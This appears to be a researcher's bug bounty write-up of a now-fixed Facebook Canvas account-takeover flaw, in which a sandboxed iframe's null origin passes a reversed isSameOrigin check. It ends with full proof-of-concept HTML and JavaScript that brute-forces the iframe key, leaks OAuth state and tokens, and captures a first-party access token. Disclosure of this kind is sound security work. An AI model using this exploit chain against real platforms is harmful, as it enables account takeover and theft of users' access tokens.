---
id: 783
title: 'Account Takeover in Canvas Apps served in Comet due to failure in Cross-Window-Message Origin validation'
date: '2023-01-29T13:04:55+00:00'
author: qw
layout: post
guid: 'https://ysamm.com/?p=783'
wp_featherlight_disable:
    - ''
categories:
    - Uncategorized
---

This bug could allow a malicious actor to takeover Facebook/Meta accounts if the user decided to play a Canvas game.    
  
The new **Canvas on Comet** is using **Compat** to display dialogs( eg OAuth dialogs ) in separate iframes, the process of displaying a dialog is to first receive a message of the type of the dialog ( like oauth ) and then create an iframe hosting [apps.facebook.com/compat](https://apps.facebook.com/compat), then that iframe would communicate with the parent window via cross window messaging and then try to setup a new communication channel by sending a new MessageChannel port ( **CometCompatBroker** handles that in the parent window )

Once the new channel is established, the parent window would send the dialog uri to the iframe ( like **[https://apps.facebook.com/dialog/oauth?app_id=1774400339513387&amp;redirect_uri=https://www.facebook.com/dialog/return/arbiter%23is_canvas%3Dtrue%26origin%3D\*&amp;display=async&amp;state=fa6a98360231ec&amp;client_id=1774400339513387&amp;is_comet_compat=true&amp;cquick=jsc_c_1p&amp;cquick_token=AQ4d9gLTLArx2JrntAk&amp;ctarget=https%3A%2F%2Fapps.facebook.com](https://apps.facebook.com/dialog/oauth?app_id=1774400339513387&redirect_uri=https://www.facebook.com/dialog/return/arbiter%23is_canvas%3Dtrue%26origin%3D*&display=async&state=fa6a98360231ec&client_id=1774400339513387&is_comet_compat=true&cquick=jsc_c_1p&cquick_token=AQ4d9gLTLArx2JrntAk&ctarget=https%3A%2F%2Fapps.facebook.com)** ) and then the iframe would make an async request and display the response which should be a dialog.  
The step of establishing a new communication channel by sharing a MessageChannel Port is crucial since there are no more checks done to messages coming through that MessageChannel and the source is considered trusted. Before using the new communication channel, multiple checks are done to the source or sender of the message ( containing the MessageChannel port ) , CometCompatBroker verifies the origin of the message:

**CometCompatBroker : setupMessageChannel function:**

```javascript
var d = c("getMessageEventString")(a, "compatAction")
, e = c("getMessageEventString")(a, "iframeKey");
(this.$CometCompatBroker5 && i(a.origin) || h(a.origin)) && d === "CompatSetup" && e === this.$CometCompatBroker2 && (this.$CometCompatBroker1 && this.$CometCompatBroker1.close(),
a.ports != null && Array.isArray(a.ports) && (this.$CometCompatBroker1 = a.ports[0],
this.$CometCompatBroker1.onmessage = this.$CometCompatBroker6,
b()))
```

The interesting verification part is: h(a.origin)) &amp;&amp; d === “CompatSetup” &amp;&amp; e === this.$CometCompatBroker2 . So it has two checks, it would verify if iframeKey matches “e” and if the origin is allowed by passing it to function “h”; the first verification could be bypassed by bruteforcing because iframeKey has a unique format js_c_XX where XX can be in the charset \[a-z0-9\].

function h has this code:

```javascript
var b = d("ConstUriUtils").getUri(a);
if (b == null) {
c("FBLogger")("comet_infra").mustfix("Failed to parse the origin `%s`", a);
return !1
}
a = ["apps", "secure", "www"].some(function(a) {
a = d("ConstUriUtils").getUri(c("getCompatIframeOrigin")(a));
return a == null ? !1 : b.isSameOrigin(a)
});
if (a)
return !0;
a = d("ConstUriUtils").getUri(document.location.origin.replace(/facebook\.com/i, "messenger.com"));
return a ? b.isSameOrigin(a) : !1
```

Here it creates a new URI object in b, then try to verify the domain. The bypass would be to send the message from a sandboxed iframe which would have the origin set to “null” in that case, **d(“ConstUriUtils”).getUri(a)** would return an URI object where protocol, domain , port all equal to null. The check to see if the origin is allowed is done via b.isSameOrigin(a) ; that function has this code:

```javascript
if (this.getProtocol() && this.getProtocol() !== a.getProtocol())
return !1;
if (this.getDomain() && this.getDomain() !== a.getDomain())
return !1;
if (this.getPort() && this.getPort() !== a.getPort())
return !1;
return this.toString() === "" || a.toString() === "" ? !1 : !0
```

  
Since b, as we mentioned, has protocol, domain and port undefined, all checks would pass and the final one (this.toString() ) would return “null” and not “”. **The correct way to use this function is to check if the trusted domain isSameOrigin with the untrusted one : ( a.isSameOrigin(b) instead of b.isSameOrigin(a) )** .

Now since the origin check was bypassed and the MessageChannel port sent is being used, we would send this message to the port , {compatAction:”request-loaddialog”} ; the parent window would send back the dialog-url mentioned before , ( check **CometCompatModalUniversal.react** , j.sendChildFrameParams({ compatAction: “loaddialog”, rel: a.params.rel, uri: a.params.uri }) modules for more details) .

The dialog url like ****[https://apps.facebook.com/dialog/oauth?app_id=1774400339513387&amp;redirect_uri=https://www.facebook.com/dialog/return/arbiter%23is_canvas%3Dtrue%26origin%3D\*&amp;display=async&amp;state=fa6a98360231ec&amp;client_id=1774400339513387&amp;is_comet_compat=true&amp;cquick=jsc_c_1p&amp;cquick_token=AQ4d9gLTLArx2JrntAk&amp;ctarget=https%3A%2F%2Fapps.facebook.com](https://apps.facebook.com/dialog/oauth?app_id=1774400339513387&redirect_uri=https://www.facebook.com/dialog/return/arbiter%23is_canvas%3Dtrue%26origin%3D*&display=async&state=fa6a98360231ec&client_id=1774400339513387&is_comet_compat=true&cquick=jsc_c_1p&cquick_token=AQ4d9gLTLArx2JrntAk&ctarget=https%3A%2F%2Fapps.facebook.com)**** would leak the cquick_token and the state. Now comes the best part! :

The **state** parameter actually represent the name of the callback function which would receive the Arbiter(“platform/dialog/response”) message containing the access_token/code and pass it to the source window that asked for the access_token/code:  
  
**PlatformDialogClient.async:**

```javascript
 function o(a, b, d, e) {
        var f = b.state;
        b.state = d;
        var g = {
            origin: b.redirect_uri
        };
        b.is_canvas === !0 && (g.is_canvas = "true",
        delete b.is_canvas);
        b.redirect_uri = new (c("URI"))("/dialog/return/arbiter").setSubdomain("www").setFragment(c("QueryString").encode(g)).getQualifiedURI().toString();
        b.display = "async";
        j[d] = {
            callback: e || function() {}
            ,
            state: f
        };
        return p(a, b)
    }
```

Notice here that j contains a set of callback functions, the name of the objects are set to “d” variable which is the the **state** in this case ( d was passed to function o and it was randomly generated )  
  
The trick here is that the attacker would construct a new request to /dialog/oauth endpoint while requesting an access token for a first party application and redirect uri set to [facebook.com/dialog/return/arbiter](https://facebook.com/dialog/return/arbiter) and set the state to the leaked one ( also we use the leaked cquick_token to manage to iframe the dialog/oauth endpoint since the page is normally have X-Frame-Options: Deny which would become SAMEORIGIN), in the dialog/oauth response, it would try to send the response to the parent window by calling a parent window function with the access_token/code and the state leaked.   
  
The parent window once it has received the response, it would assume it’s from the request it has initiated which would enforce app_id/client_id ( the app_id of the game owned by the attacker ) however of course the response came from another source.   
  
The iframe containing the request to get a first-party access_token would be like this:

```javascript
https://www.facebook.com/dialog/oauth?app_id=124024574287414&redirect_uri=https%3A%2F%2Fwww.facebook.com/dialog/return/arbiter%3Fversion%3D46%26relation%3Dtop%23origin%3Dfb124024574287414://authorize&ctarget=https%3A%2F%2Fapps.facebook.com&cquick=1&response_type=token&cquick_token=STOKEN_TOKEN&state=STOLEN_STATE
```

The response would be something like this:

```markup
<script nonce="5xD0Fobl">
    (function _(a, b, c, d, e) {
        a = window[a];
        if (a)
            if (window.location.protocol == b)
                a.closed || a.require("Arbiter").inform("platform/dialog/response", d);
            else if (a.postMessage) {
                if (!b.match(/^https?:$/) || !c.match(/\.facebook\.(com|sg)$/) || !c.match(/\.facebookcorewwwi\.(?:test)?onion$/))
                    throw new Error("Invalid Origin: " + b + "//" + c);
                a.postMessage("FB_DIALOG_RESPONSE:" + JSON.stringify(d), b + "//" + c)
            }
        e && window.close();
        e && !window.closed && window.closeURI && window.location.replace(window.closeURI)
    }
    )("top", "https:", "apps.facebook.com", {
        "access_token": "FIRST_PART_ACCESS_TOKEN",
        "data_access_expiration_time": 0,
        "expires_in": 0
    }, false);
</script>

```

  
We notice a.require(“Arbiter”).inform(“platform/dialog/response”, d) with “a” being the top/parent window; since both windows are same-origin this is allowed. In the parent window we have this code:

```javascript
c("Arbiter").subscribe(c("PlatformDialog").RESPONSE, function(a, b) {
        a = b.state;
        j[a] && (j[a].callback(b),
        b.state = j[a].state,
        delete j[a])
    }, "new");
```

Once (“Arbiter”).inform is used, this subscribed function would be executed, which would verify if the state (obj key) is valid and in that case call the callback function while passing the response containing the access_token as an argument. The callback function simply send a cross-window-message with postMessage to the window that made the request ( the iframe allegedly containing our game in Facebook Canvas ) and thus leaking a first-party token or code which can be used to access the Meta account and all other accounts like Facebook, Instagram.

**Proof of concept code**

```markup
/
<html>
    <script>
        brutelist = []
        channels = []
        charset = ["0","1","2","3","4","5","6","7","8","9"];
        for(let x=0;x<26;x++){
            charset.push(String.fromCharCode(x+97))
        }
        for(let x=0;x<charset.length;x++){
            for(let i=0;i<charset.length;i++){
            brutelist.push(charset[x]+charset[i]);
        }
        }
        // Extract state and cquick_token then 
        function message_receiver(message) {
            uri = new URL("https://ysamm.com" + message.data.uri);
            token = uri.searchParams.get("cquick_token");
            state = uri.searchParams.get("state");
            final_url = "https://apps.facebook.com/dialog/oauth?app_id=124024574287414&redirect_uri=https%3A%2F%2Fwww.facebook.com/dialog/return/arbiter%3Fversion%3D46%26relation%3Dtop%23origin%3Dfb124024574287414://authorize&ctarget=https%3A%2F%2Fapps.facebook.com&cquick=1&response_type=token&cquick_token=" + token + "&state=" + state;
           window.location.href = final_url;
        }
        
        function brute_ifrm_name(){
            i=0;
            intv = setInterval(()=> {
                if (i>brutelist.length) clearInterval(intv);
                i++;
                x = new MessageChannel(); 
                // Bruteforce the iframeKey
                ifrm_name = "jsc_c_" + brutelist[i];
                parent.postMessage({compatAction:"CompatSetup",iframeKey:ifrm_name},"*",[x.port1]);
                // Setup the function that receives the message.
                x.port2.onmessage = message_receiver;
                // Get the dialog URL with cquick_token and state
                setTimeout(()=>{x.port2.postMessage({compatAction:"request-loaddialog"});},10);
            
            },20);
        }
        function oauth_send() {
            // This window would receive the response with access_token finally since we're redirecting in this window to the dialog/oauth url. 
            window.open("stage2.html","", "width=200,height=100");
            setTimeout(()=>{
                brute_ifrm_name();
            },2000);
        }
        
        oauth_send()

    </script>
</html>
```

stage2.html

```markup

<html>
<script>
onmessage= (e)=>{
            alert("We got the token:" + e.data)
}
        opener.parent.postMessage({"xdArbiterHandleMessage":true,"message":"FB_RPC:{\"jsonrpc\":\"2.0\",\"method\":\"showDialog\",\"id\":1,\"params\":[{\"method\":\"permissions.oauth\",\"redirect_uri\":\"https://ysamm.com\",\"is_canvas\":true}]}","origin":["*"]},"*");

</script>
</html>
```

**Timeline**

Nov 22, 2022— Report Sent   
Nov 22, 2022— Acknowledged by Meta  
Dec 12, 2022— Fixed by Meta  
Dec 27, 2022 — $62500 bounty awarded by Meta. ( Including bonuses )

</body></html>